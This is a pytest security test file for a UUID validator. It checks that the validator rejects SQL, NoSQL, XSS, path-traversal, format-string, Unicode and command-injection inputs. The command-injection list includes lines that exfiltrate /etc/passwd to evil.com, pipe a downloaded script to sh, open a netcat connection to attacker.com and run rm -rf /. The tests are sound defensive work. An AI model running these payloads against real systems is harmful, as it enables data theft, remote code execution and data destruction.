"""
Security tests for IDValidator domain service.
Tests security aspects including injection attacks, malformed inputs,
and security boundaries to ensure robust protection against malicious inputs.
"""

import pytest
import re
from uuid import uuid4
from unittest.mock import patch, Mock
from fastmcp.utilities.id_validator import (
    IDValidator,
    IDType,
    ValidationResult,
    IDValidationError,
    validate_uuid,
    prevent_id_confusion,
)


class TestSecurityVulnerabilities:
    """Tests for security vulnerabilities and attack vectors."""

    def setup_method(self):
        """Set up test fixtures."""
        self.validator = IDValidator(strict_uuid_validation=True)

    def test_sql_injection_prevention(self):
        """Test prevention of SQL injection attacks through ID parameters."""
        sql_injection_payloads = [
            # Basic SQL injection attempts
            "550e8400'; DROP TABLE tasks; --",
            "550e8400' OR '1'='1",
            "550e8400-e29b-41d4-a716-446655440000'; DELETE FROM users; --",

            # Union-based injections
            "550e8400' UNION SELECT * FROM sensitive_data --",
            "550e8400-e29b-41d4-a716-446655440000' UNION ALL SELECT password FROM users --",

            # Boolean-based blind injections
            "550e8400' AND (SELECT COUNT(*) FROM users) > 0 --",
            "550e8400-e29b-41d4-a716-446655440000' AND SLEEP(5) --",

            # Time-based blind injections
            "550e8400'; WAITFOR DELAY '00:00:05' --",
            "550e8400' OR (SELECT * FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --",

            # Stacked queries
            "550e8400'; INSERT INTO admin_users VALUES ('hacker', 'password'); --",
            "550e8400-e29b-41d4-a716-446655440000'; UPDATE users SET role='admin' WHERE id=1; --",
        ]

        for payload in sql_injection_payloads:
            result = self.validator.validate_uuid_format(payload)
            assert result.is_valid is False, f"SQL injection payload should be rejected: {payload}"
            assert "Invalid UUID format" in result.error_message

    def test_nosql_injection_prevention(self):
        """Test prevention of NoSQL injection attacks."""
        nosql_injection_payloads = [
            # MongoDB injection attempts
            "550e8400'; return true; //",
            "550e8400-e29b-41d4-a716-446655440000'; db.users.drop(); //",
            "550e8400' || '1'=='1",

            # JSON injection
            '550e8400", "$where": "function() { return true; }", "id": "550e8400',
            '550e8400-e29b-41d4-a716-446655440000", "role": "admin", "id": "fake',

            # LDAP injection
            "550e8400')(|(objectClass=*))",
            "550e8400-e29b-41d4-a716-446655440000*)(uid=*))(|(uid=*",
        ]

        for payload in nosql_injection_payloads:
            result = self.validator.validate_uuid_format(payload)
            assert result.is_valid is False, f"NoSQL injection payload should be rejected: {payload}"

    def test_xss_prevention_in_error_messages(self):
        """Test that error messages don't enable XSS attacks."""
        xss_payloads = [
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "<img src=x onerror=alert('xss')>",
            "<svg onload=alert('xss')>",
            "550e8400-e29b-41d4-a716-446655440000<script>alert('xss')</script>",
            "550e8400';alert('xss');//",
        ]

        for payload in xss_payloads:
            result = self.validator.validate_uuid_format(payload)
            assert result.is_valid is False

            # Verify error message doesn't contain dangerous HTML/JS
            error_msg = result.error_message
            assert "<script>" not in error_msg
            assert "javascript:" not in error_msg
            assert "<img" not in error_msg
            assert "<svg" not in error_msg
            assert "onerror" not in error_msg
            assert "onload" not in error_msg

    def test_path_traversal_prevention(self):
        """Test prevention of path traversal attacks."""
        path_traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "550e8400-e29b-41d4-a716-446655440000/../../../sensitive_file",
            "550e8400-e29b-41d4-a716-446655440000%2e%2e%2f%2e%2e%2f%2e%2e%2f",
            "550e8400-e29b-41d4-a716-446655440000....//....//....//",
            "file:///etc/passwd",
            "file://c:/windows/system32/config/sam",
        ]

        for payload in path_traversal_payloads:
            result = self.validator.validate_uuid_format(payload)
            assert result.is_valid is False, f"Path traversal payload should be rejected: {payload}"

    def test_command_injection_prevention(self):
        """Test prevention of command injection attacks."""
        command_injection_payloads = [
            "550e8400; cat /etc/passwd",
            "550e8400 && rm -rf /",
            "550e8400-e29b-41d4-a716-446655440000; shutdown -h now",
            "550e8400 | nc attacker.com 4444",
            "550e8400`whoami`",
            "550e8400$(id)",
            "550e8400-e29b-41d4-a716-446655440000; curl http://evil.com/steal?data=$(cat /etc/passwd)",
            "550e8400 > /dev/null; wget http://evil.com/malware.sh -O - | sh",
        ]

        for payload in command_injection_payloads:
            result = self.validator.validate_uuid_format(payload)
            assert result.is_valid is False, f"Command injection payload should be rejected: {payload}"

    def test_buffer_overflow_attempts(self):
        """Test handling of extremely long inputs that might cause buffer overflows."""
        # Extremely long strings
        long_payloads = [
            "A" * 10000,
            "550e8400-e29b-41d4-a716-446655440000" + "A" * 9000,
            "B" * 100000,
            "\x00" * 1000,  # Null bytes
            "\xFF" * 1000,  # High bytes
        ]

        for payload in long_payloads:
            result = self.validator.validate_uuid_format(payload)
            assert result.is_valid is False, f"Long payload should be rejected safely: len={len(payload)}"
            # Validator should handle gracefully without crashing

    def test_unicode_exploitation_attempts(self):
        """Test handling of Unicode exploitation attempts."""
        unicode_payloads = [
            # Unicode normalization attacks
            "550e8400-e29b-41d4-a716-44665544000\u0065",  # Unicode 'e'
            "550e8400-e29b-41d4-a716-446655440000\u202e",  # Right-to-left override
            "550e8400-e29b-41d4-a716-446655440000\uFEFF",  # Byte order mark

            # Mixed scripts (potential homograph attacks)
            "550е8400-е29b-41d4-а716-446655440000",  # Cyrillic 'е' instead of 'e'
            "550e8400-e29b-41d4-a716-44665544000α",  # Greek alpha

            # Control characters
            "550e8400-e29b-41d4-a716-446655440000\x00",
            "550e8400-e29b-41d4-a716-446655440000\x0A",
            "550e8400-e29b-41d4-a716-446655440000\x0D",
            "550e8400-e29b-41d4-a716-446655440000\x1B",
        ]

        for payload in unicode_payloads:
            result = self.validator.validate_uuid_format(payload)
            assert result.is_valid is False, f"Unicode payload should be rejected: {repr(payload)}"

    def test_format_string_attacks(self):
        """Test prevention of format string attacks."""
        format_string_payloads = [
            "550e8400-%s-%s-%s-%s",
            "550e8400-%x-%x-%x-%x",
            "550e8400-%n-%n-%n-%n",
            "550e8400-e29b-41d4-a716-446655440000%s%s%s%s",
            "550e8400-e29b-41d4-a716-446655440000%x%x%x%x",
            "%08x%08x%08x%08x%08x%08x%08x%08x",
        ]

        for payload in format_string_payloads:
            result = self.validator.validate_uuid_format(payload)
            assert result.is_valid is False, f"Format string payload should be rejected: {payload}"

    def test_regex_dos_prevention(self):
        """Test prevention of ReDoS (Regular Expression Denial of Service) attacks."""
        # Patterns that could cause catastrophic backtracking
        redos_payloads = [
            # Nested quantifiers
            "5" + "5" * 1000 + "0e8400-e29b-41d4-a716-446655440000",
            "550e8400-" + "e" * 1000 + "29b-41d4-a716-446655440000",
            "550e8400-e29b-" + "4" * 1000 + "1d4-a716-446655440000",

            # Alternation with overlapping patterns
            "550e8400-e29b-41d4-a716-446655440000" + ("a|a" * 500),

            # Grouping with quantifiers
            "550e8400-e29b-41d4-a716-446655440000" + "(a+)+b",
            "550e8400-e29b-41d4-a716-446655440000" + "(a*)*b",
        ]

        import time

        for payload in redos_payloads:
            start_time = time.time()
            result = self.validator.validate_uuid_format(payload)
            elapsed_time = time.time() - start_time

            # Validation should complete quickly (< 100ms) to prevent DoS
            assert elapsed_time < 0.1, f"Validation took too long: {elapsed_time:.3f}s for payload length {len(payload)}"
            assert result.is_valid is False

    def test_null_byte_injection(self):
        """Test handling of null byte injection attempts."""
        null_byte_payloads = [
            "550e8400-e29b-41d4-a716-446655440000\x00",
            "550e8400-e29b-41d4-a716-446655440000\x00.txt",
            "550e8400\x00-e29b-41d4-a716-446655440000",
            "\x00550e8400-e29b-41d4-a716-446655440000",
            "550e8400-e29b-41d4-a716-446655440000\x00/etc/passwd",
        ]

        for payload in null_byte_payloads:
            result = self.validator.validate_uuid_format(payload)
            assert result.is_valid is False, f"Null byte payload should be rejected: {repr(payload)}"

    def test_malformed_encoding_attacks(self):
        """Test handling of malformed encoding attacks."""
        malformed_encoding_payloads = [
            # Invalid UTF-8 sequences
            b"550e8400-e29b-41d4-a716-446655440000\xFF\xFE".decode('utf-8', errors='ignore'),
            b"550e8400-e29b-41d4-a716-446655440000\x80\x81".decode('utf-8', errors='ignore'),

            # Overlong UTF-8 sequences (if they slip through)
            "550e8400-e29b-41d4-a716-446655440000\xC0\x80",  # Overlong null
            "550e8400-e29b-41d4-a716-446655440000\xE0\x80\x80",  # Overlong null
        ]

        for payload in malformed_encoding_payloads:
            result = self.validator.validate_uuid_format(payload)
            assert result.is_valid is False, f"Malformed encoding should be rejected: {repr(payload)}"


class TestSecurityBoundaries:
    """Tests for security boundaries and access controls."""

    def setup_method(self):
        """Set up test fixtures."""
        self.validator = IDValidator(strict_uuid_validation=True)

    def test_parameter_mapping_security_validation(self):
        """Test security validation in parameter mapping."""
        # Test with potentially dangerous parameter combinations
        malicious_combinations = [
            {
                "task_id": "550e8400'; DROP TABLE tasks; --",
                "git_branch_id": str(uuid4()),
                "user_id": str(uuid4())
            },
            {
                "task_id": str(uuid4()),
                "git_branch_id": "<script>alert('xss')</script>",
                "user_id": str(uuid4())
            },
            {
                "task_id": str(uuid4()),
                "git_branch_id": str(uuid4()),
                "user_id": "../../../etc/passwd"
            }
        ]

        for combo in malicious_combinations:
            result = self.validator.validate_parameter_mapping(**combo)
            assert result.is_valid is False, f"Malicious combination should be rejected: {combo}"

    def test_context_validation_security(self):
        """Test security aspects of context validation."""
        # Test with malicious context hints
        malicious_contexts = [
            "<script>alert('xss')</script>",
            "'; DROP TABLE contexts; --",
            "../../../etc/passwd",
            "javascript:alert('xss')",
            "\x00admin_context",
        ]

        valid_uuid = str(uuid4())

        for context in malicious_contexts:
            result = self.validator.detect_id_type(valid_uuid, context)
            # Should still validate UUID but not trust malicious context
            assert result.is_valid is True  # UUID itself is valid
            # Context should be treated safely
            assert result.metadata.get("context_hint") == context  # But stored as-is for logging

    def test_error_information_disclosure(self):
        """Test that errors don't disclose sensitive information."""
        # Test that validation errors don't reveal system internals
        sensitive_inputs = [
            "/etc/passwd",
            "C:\\Windows\\System32\\config\\SAM",
            "database_connection_string",
            "secret_api_key_12345",
            "internal_server_path_/opt/app/secrets",
        ]

        for sensitive_input in sensitive_inputs:
            result = self.validator.validate_uuid_format(sensitive_input)
            assert result.is_valid is False

            # Error message should be generic, not revealing the actual input
            error_msg = result.error_message.lower()
            assert "invalid uuid format" in error_msg
            # Should not reveal system paths or sensitive strings
            assert "/etc/" not in error_msg
            assert "c:\\" not in error_msg.replace("\\", "\\\\")
            assert "secret" not in error_msg
            assert "password" not in error_msg

    def test_timing_attack_resistance(self):
        """Test resistance to timing attacks."""
        import time

        # Test with valid and invalid UUIDs to ensure consistent timing
        valid_uuid = str(uuid4())
        invalid_uuids = [
            "invalid-uuid",
            "550e8400-invalid-format",
            "not-a-uuid-at-all",
            "",
            "x" * 36
        ]

        # Measure timing for valid UUID
        times_valid = []
        for _ in range(100):
            start = time.perf_counter()
            result = self.validator.validate_uuid_format(valid_uuid)
            end = time.perf_counter()
            times_valid.append(end - start)
            assert result.is_valid is True

        # Measure timing for invalid UUIDs
        times_invalid = []
        for invalid_uuid in invalid_uuids:
            for _ in range(20):  # Fewer iterations per invalid UUID
                start = time.perf_counter()
                result = self.validator.validate_uuid_format(invalid_uuid)
                end = time.perf_counter()
                times_invalid.append(end - start)
                assert result.is_valid is False

        # Calculate averages
        avg_valid = sum(times_valid) / len(times_valid)
        avg_invalid = sum(times_invalid) / len(times_invalid)

        # Timing difference should not be significant (< 10x difference)
        # This prevents attackers from determining validity through timing
        timing_ratio = max(avg_valid, avg_invalid) / min(avg_valid, avg_invalid)
        assert timing_ratio < 10, f"Timing difference too large: {timing_ratio:.2f}x (valid: {avg_valid:.6f}s, invalid: {avg_invalid:.6f}s)"

    def test_memory_exhaustion_protection(self):
        """Test protection against memory exhaustion attacks."""
        # Test with increasingly large inputs
        for size in [1000, 10000, 100000]:
            large_input = "A" * size

            # Should handle large inputs without excessive memory usage
            result = self.validator.validate_uuid_format(large_input)
            assert result.is_valid is False

            # Validator should not store the entire input in memory indefinitely
            # (This is implicit - if test completes without memory error, it passes)

    def test_prevent_id_confusion_security(self):
        """Test security aspects of prevent_id_confusion function."""
        # Test with malicious inputs
        malicious_params = {
            "task_id": "550e8400'; DELETE FROM tasks; --",
            "git_branch_id": "<script>alert('xss')</script>",
            "user_id": "../../../etc/passwd"
        }

        with pytest.raises(IDValidationError) as exc_info:
            prevent_id_confusion(**malicious_params)

        # Exception should not contain the malicious input verbatim
        error_str = str(exc_info.value)
        assert "DELETE FROM" not in error_str
        assert "<script>" not in error_str
        assert "etc/passwd" not in error_str

    def test_validator_state_security(self):
        """Test that validator state cannot be corrupted by malicious inputs."""
        # Create validator
        validator = IDValidator(strict_uuid_validation=True)

        # Try to corrupt with malicious inputs
        malicious_inputs = [
            "'; UPDATE validator_state SET strict=false; --",
            "<script>validator.strict_uuid_validation = false;</script>",
            "../../../../config/validator.conf",
            "\x00\x01\x02\x03\x04\x05",
        ]

        # Validator state should remain consistent
        original_strict = validator.strict_uuid_validation

        for malicious_input in malicious_inputs:
            result = validator.validate_uuid_format(malicious_input)
            assert result.is_valid is False
            # State should not be corrupted
            assert validator.strict_uuid_validation == original_strict

        # Validator should still work correctly after malicious inputs
        valid_uuid = str(uuid4())
        result = validator.validate_uuid_format(valid_uuid)
        assert result.is_valid is True


class TestSecurityLogging:
    """Tests for security logging and monitoring."""

    def setup_method(self):
        """Set up test fixtures."""
        self.validator = IDValidator(strict_uuid_validation=True)

    @patch('fastmcp.utilities.id_validator.logger')
    def test_security_event_logging(self, mock_logger):
        """Test that security events are properly logged."""
        # Test suspicious patterns that should be logged
        suspicious_inputs = [
            "550e8400'; DROP TABLE users; --",
            "<script>alert('xss')</script>",
            "../../../etc/passwd",
            "550e8400-e29b-41d4-a716-446655440000" + "A" * 10000,
        ]

        for suspicious_input in suspicious_inputs:
            result = self.validator.validate_uuid_format(suspicious_input)
            assert result.is_valid is False

        # In a real implementation, these would trigger security logging
        # For now, we just verify the validator handles them safely

    def test_audit_trail_integrity(self):
        """Test that validation creates proper audit trails."""
        # Test that validation results contain proper metadata for auditing
        test_cases = [
            ("valid", str(uuid4())),
            ("invalid_format", "not-a-uuid"),
            ("sql_injection", "550e8400'; DROP TABLE users; --"),
            ("xss_attempt", "<script>alert('xss')</script>"),
        ]

        for case_name, test_input in test_cases:
            result = self.validator.validate_uuid_format(test_input)

            # Result should contain audit information
            assert result.original_value == test_input
            assert result.id_type is not None
            assert result.is_valid is not None

            if not result.is_valid:
                assert result.error_message is not None


if __name__ == "__main__":
    pytest.main([__file__, "-v"])